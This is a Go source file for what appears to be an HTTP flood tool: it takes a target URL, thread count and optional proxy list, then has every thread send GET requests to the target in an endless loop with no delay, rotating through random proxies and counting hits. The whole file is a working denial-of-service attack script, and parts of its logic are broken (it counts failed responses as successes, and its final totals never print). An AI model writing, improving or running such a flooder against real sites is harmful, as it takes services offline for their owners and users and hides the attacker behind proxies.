package main

import (
    "bufio"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
    "net"
)

type errorStats struct {
    count    int
    errorMap map[string]int
    mu       sync.Mutex
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: ./main <host/url> <threads> <timeout> [<list>]")
        return
    }

    targetHost := os.Args[1]
    threads, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Error: Invalid number of threads")
        return
    }

    timeoutSeconds, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("Error: Invalid timeout value")
        return
    }
    timeout := time.Duration(timeoutSeconds) * time.Second

    var proxyList string
    if len(os.Args) > 4 {
        proxyList = os.Args[4]
    }

    var proxies []string

    // Load proxies if proxyList is provided
    if proxyList != "" {
        proxies, err = loadProxies(proxyList)
        if err != nil {
            fmt.Println("Error loading proxies:", err)
            return
        }
    }

    // Determine if proxies should be used
    useProxies := len(proxies) > 0

    // Initialize error statistics tracker
    errorStats := &errorStats{
        errorMap: make(map[string]int),
    }

    // Use channels for successful requests and error reporting
    successfulRequests := make(chan struct{})
    errorReport := make(chan error)

    // Goroutine for printing statistics
    go func() {
        var successfulCount int
        for {
            select {
            case <-successfulRequests:
                successfulCount++
            case err := <-errorReport:
                errorStats.mu.Lock()
                errorStats.count++
                errorCode := strconv.Itoa(http.StatusInternalServerError) // Default error code
                if urlErr, ok := err.(*url.Error); ok {
                    if netErr, ok := urlErr.Err.(*net.OpError); ok {
                        errorCode = netErr.Op
                    }
                }
                errorStats.errorMap[errorCode]++
                errorStats.mu.Unlock()
            }

            fmt.Printf("\rSuccessfully sent %d requests", successfulCount)
        }
    }()

    // Start goroutines for each thread
    var wg sync.WaitGroup
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            sendRequests(targetHost, proxies, timeout, successfulRequests, errorReport)
        }()
    }

    // Wait for all goroutines to finish
    wg.Wait()

    // Close channels after all requests are done
    close(successfulRequests)
    close(errorReport)

    // Print final statistics
    fmt.Println("\n\nError Statistics:")
    errorStats.mu.Lock()
    for errCode, count := range errorStats.errorMap {
        fmt.Printf("Error %s: %d\n", errCode, count)
    }
    fmt.Printf("Total Errors: %d\n", errorStats.count)
    errorStats.mu.Unlock()

    totalRequests := len(proxies) * threads
    if !useProxies {
        totalRequests = threads
    }
    fmt.Printf("Total Requests: %d\n", totalRequests)
}

func loadProxies(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var proxies []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxy := strings.TrimSpace(scanner.Text())
        if proxy != "" {
            proxies = append(proxies, proxy)
        }
    }

    if err := scanner.Err(); err != nil {
        return nil, err
    }

    return proxies, nil
}

func sendRequests(targetHost string, proxies []string, timeout time.Duration, successfulRequests chan struct{}, errorReport chan error) {
    for {
        var httpClient *http.Client

        // Use proxy if provided and not empty
        if len(proxies) > 0 {
            proxy := proxies[rand.Intn(len(proxies))]
            httpClient = &http.Client{
                Timeout: timeout,
                Transport: &http.Transport{
                    Proxy: http.ProxyURL(makeProxyURL(proxy)),
                },
            }
        } else {
            // Use raw connection
            httpClient = &http.Client{
                Timeout: timeout,
            }
        }

        req, err := http.NewRequest("GET", targetHost, nil)
        if err != nil {
            errorReport <- err
            continue
        }

        resp, err := httpClient.Do(req)
        if err != nil {
            errorReport <- err
            continue
        }

        // Close response body
        resp.Body.Close()

        // Handle response
        if resp.StatusCode >= 200 && resp.StatusCode < 300 {
            // Signal successful request if using proxies
            if successfulRequests != nil {
                successfulRequests <- struct{}{}
            }
        } else {
            // Report error
            successfulRequests <- struct{}{}
            errorReport <- fmt.Errorf("HTTP error: %s", resp.Status)
        }

        // Sleep for a while before making the next request
        //time.Sleep(1 * time.Second)
    }
}

func makeProxyURL(proxy string) *url.URL {
    proxyURL, _ := url.Parse("http://" + proxy)
    return proxyURL
}
